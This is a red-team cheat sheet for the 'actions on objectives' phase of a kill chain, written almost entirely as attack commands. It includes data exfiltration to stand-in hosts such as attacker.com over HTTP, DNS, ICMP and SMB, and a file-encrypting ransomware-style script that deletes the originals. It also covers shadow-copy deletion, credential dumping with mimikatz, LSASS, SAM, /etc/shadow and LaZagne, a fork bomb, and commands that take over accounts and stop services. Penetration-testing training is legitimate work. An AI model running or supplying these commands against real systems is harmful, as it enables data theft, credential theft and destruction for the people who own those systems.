# 🎯 Phase 7: Actions on Objectives

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**Goal:** Achieve the final objective - data exfiltration, destruction, or other impact.

---

## 📤 Data Exfiltration

### Finding Sensitive Data

#### Windows
```cmd
# Search for sensitive files
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# Find files modified recently
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell - search by content
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux
```bash
# Search for sensitive files
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# Recent files
find / -mtime -7 -type f 2>/dev/null

# Large files
find / -size +100M -type f 2>/dev/null
```

### Compress & Stage Data

#### Windows
```powershell
# PowerShell - Create ZIP
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# Tar with compression
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# Create compressed archive
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# With encryption
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# ZIP with password
zip -r -e data.zip /sensitive/
```

### Exfiltration Methods

#### HTTP/HTTPS
```bash
# Upload via curl
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Base64 via GET (small data)
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# PowerShell upload
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### DNS Exfiltration
```bash
# Encode data in DNS queries
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# Using dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP
```bash
# Exfil via ping
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# Using icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB
```bash
# Copy to attacker share
copy C:\Sensitive\data.zip \\attacker_ip\share\

# Mount and copy (Linux)
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### Cloud Services
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

## 💣 Destructive Actions (Ransomware Simulation)

> ⚠️ **WARNING:** Only for authorized red team engagements!

### Encryption Simulation
```powershell
# PowerShell - Encrypt files (simulation)
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### Volume Shadow Copy Deletion
```cmd
# Delete shadow copies (prevents recovery)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Disable shadow copies
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

## 🔐 Credential Harvesting

### Windows Credentials
```powershell
# Mimikatz - All credentials
mimikatz# sekurlsa::logonpasswords

# Dump SAM database
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# LSASS dump
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# Extract from dump
pypykatz lsa minidump lsass.dmp
```

### Linux Credentials
```bash
# Shadow file
cat /etc/shadow

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Config files
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### Browser Credentials
```bash
# Chrome credentials (Windows)
# Location: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Firefox credentials (Windows)
# Location: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne - All browser passwords
python laZagne.py all
```

---

## 🖥️ System Impact

### Denial of Service
```bash
# Fork bomb (Linux) - DON'T RUN!
:(){ :|:& };:

# Fill disk
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# CPU exhaustion
yes > /dev/null &
```

### Account Manipulation
```bash
# Change all user passwords
net user administrator NewP@ssw0rd!

# Lock accounts
net user username /active:no

# Delete users
net user username /delete
```

### Service Disruption
```cmd
# Stop critical services
net stop "DNS Server"
net stop "Active Directory Domain Services"

# Disable services
sc config wuauserv start= disabled
```

---

## 📊 Quick Reference

### Exfiltration Methods

| Method | Pros | Cons |
|--------|------|------|
| HTTP/HTTPS | Common traffic, encrypted | May be monitored |
| DNS | Often unmonitored | Slow, size limits |
| ICMP | May bypass firewalls | Very slow |
| SMB | Fast, native | Internal only |
| Cloud | Legitimate services | Requires creds |

### Data Location Priorities

| Location | Value |
|----------|-------|
| Domain Controller | Highest - AD credentials |
| File Servers | High - Documents |
| Email Servers | High - Communications |
| Database Servers | High - Business data |
| Development Servers | Medium - Source code |
| User Workstations | Medium - Local files |

---

## ✅ Pentest Report Checklist

```markdown
- [ ] Document all compromised systems
- [ ] List all discovered credentials
- [ ] Map attack path from initial access
- [ ] Document vulnerabilities exploited
- [ ] Note sensitive data locations found
- [ ] Provide remediation recommendations
- [ ] Include timeline of activities
- [ ] Screenshot evidence of access
```

---

## 🔗 Related Cheatsheets

- [Mimikatz](../Mimikatz/README.md)
- [Linux Commands](../Linux-Commands/README.md)
- [PowerShell](../PowerShell/README.md)

---

**Previous Phase:** [← 06 - Defense Evasion](./06-Defense-Evasion.md)

**Back to Overview:** [🎯 Kill Chain Overview](./README.md)

---

<p align="center">
  <b>🎯 Mission Complete!</b><br>
  <i>Remember: Only perform these actions with proper authorization!</i>
</p>
